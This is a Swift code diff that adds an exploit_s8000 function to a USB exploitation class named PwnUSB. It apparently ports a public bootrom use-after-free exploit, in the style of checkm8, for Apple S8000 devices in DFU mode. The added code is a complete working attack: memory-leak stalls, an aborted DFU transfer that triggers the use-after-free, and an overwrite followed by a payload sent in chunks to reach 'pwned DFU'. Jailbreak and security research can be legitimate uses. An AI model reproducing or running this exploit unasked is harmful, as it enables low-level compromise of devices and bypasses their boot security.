@@ -292,6 +292,92 @@ class PwnUSB<Implementation: PwnUSBDeviceImplementation> {
         }
     }
     
+	func exploit_s8000(status: StatusIndicator?) throws {
+		// based on a1exdandy's code - https://gist.github.com/a1exdandy/ae3fb332efac879e97a41291f7fef727
+		
+		guard device.serialNumber != nil else {
+			throw PwnException(message: "Device has no serial number!")
+		}
+		
+		if pwned {
+			return
+		}
+		
+		status?.update("Leaking memory")
+		
+		// let padding: UInt64 = 0x400 + 0x80 + 0x80 // padding system seems to already be implemented
+		// let overwrite = struct_pack("<32xQQ", 0x180380000, 0) // using different offset
+		// let payload_s8000 = getDevicePayload(0x8000) // using device config payload
+		
+		stall()
+		leak()
+		for _ in 0..<config.hole {
+			no_leak()
+		}
+		
+		device.reset()
+		
+		usleep(100)
+		
+		try acquire_device()
+		
+		status?.update("Triggering UaF")
+		
+		guard device.serialNumber != nil else {
+			throw PwnException(message: "Device has no serial number!")
+		}
+		
+		let bmRequestType = makeRequestType(direction: .HostToDevice, type: .Class, recipient: .Interface)
+		let dataSent = try device.device.asyncAbortedTransferToDevice(requestType: bmRequestType, request: DFU_DNLOAD, value: 0, index: 0, size: 0x800, abortAfterUSec: 15)
+		// _ = try? device.sendToDevice(type: .Standard, recipient: .Device, request: 0, value: 0, index: 0, data: emptyData(withSize: padding), timeout: 10) // padding system seems to already be implemented
+		_ = try? device.sendToDevice(type: .Standard, recipient: .Device, request: 0, value: 0, index: 0, data: emptyData(withSize: config.overwriteOffset - Int(dataSent)), timeout: 10)
+        _ = try? device.sendToDevice(type: .Class, recipient: .Interface, request: 4, value: 0, index: 0, data: Data())
+		device.close()
+		
+		usleep(UInt32(Double(USEC_PER_SEC) * 0.5))
+		
+		try acquire_device()
+		
+		status?.update("Leaking memory again")
+		
+		stall(forceLargeLeakVersion: true)
+		for _ in 1...3 {
+			leak(forceLargeLeakVersion: true)
+		}
+		
+		status?.update("Sending stage 1")
+		
+		_ = try? device.sendToDevice(type: .Standard, recipient: .Device, request: 0, value: 0, index: 0, data: config.overwrite)
+		
+		var payload = config.payload
+		while payload.count != 0 {
+			let sizeToSend = payload.count > 0x800 ? 0x800 : payload.count
+			_ = try? device.sendToDevice(type: .Class, recipient: .Interface, request: DFU_DNLOAD, value: 0, index: 0, data: payload.prefix(upTo:sizeToSend), timeout: 50)
+			
+			if payload.count > 0x800 {
+				payload = payload.advanced(by: 0x800)
+			} else {
+				break
+			}
+		}
+		
+		device.reset()
+		usleep(100)
+		device.close()
+		
+		usleep(UInt32(Double(USEC_PER_SEC) * 0.5))
+		
+		try acquire_device()
+		
+		guard device.serialNumber != nil else {
+			throw PwnException(message: "Device has no serial number!")
+		}
+		
+		if !pwned {
+			throw PwnException(message: "Exploit failed! Did not eneter pwned DFU!")
+		}
+	}
+		
     func acquire_device() throws {
         let end_time = time(nil) + 5
         var openFailed = false
